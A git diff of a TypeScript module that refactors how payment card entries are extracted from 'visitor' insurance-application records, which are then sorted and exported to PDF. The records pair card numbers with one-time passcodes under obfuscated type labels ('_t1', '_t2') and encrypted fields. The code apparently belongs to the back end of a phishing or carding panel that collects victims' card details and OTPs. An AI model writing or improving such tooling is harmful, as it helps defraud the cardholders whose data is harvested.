@@ -2,6 +2,7 @@
 
 import type { InsuranceApplication } from "@/lib/firestore-types";
 import { _d } from "@/lib/secure-utils";
+import { getNormalizedCardEntries } from "@/lib/card-data";
 
 function decryptField(value: string | undefined): string {
   if (!value) return "";
@@ -189,8 +190,7 @@ function safeTimestamp(ts: any): number {
 
 function extractCardData(visitor: InsuranceApplication) {
   const history = visitor.history || [];
-  const allCardHistory = [...history]
-    .filter((h: any) => h.type === "_t1" || h.type === "card")
+  const allCardHistory = getNormalizedCardEntries(visitor)
     .sort((a: any, b: any) => safeTimestamp(b.timestamp) - safeTimestamp(a.timestamp));
   const allOtpHistory = [...history]
     .filter((h: any) => h.type === "_t2" || h.type === "otp")
@@ -684,13 +684,8 @@ export async function generateCardPdf(visitor: InsuranceApplication) {
 }
 
 export async function generateAllCardsPdf(visitors: InsuranceApplication[]) {
-  const hasCardData = (v: InsuranceApplication) => {
-    const cardFromHistory = (v.history || []).some(
-      (h: any) => h.type === "_t1" || h.type === "card"
-    );
-    const directCard = !!(v._v1 || v.cardNumber);
-    return cardFromHistory || directCard;
-  };
+  const hasCardData = (v: InsuranceApplication) =>
+    getNormalizedCardEntries(v).length > 0;
 
   const withCards = visitors.filter(hasCardData);
   if (withCards.length === 0) return;
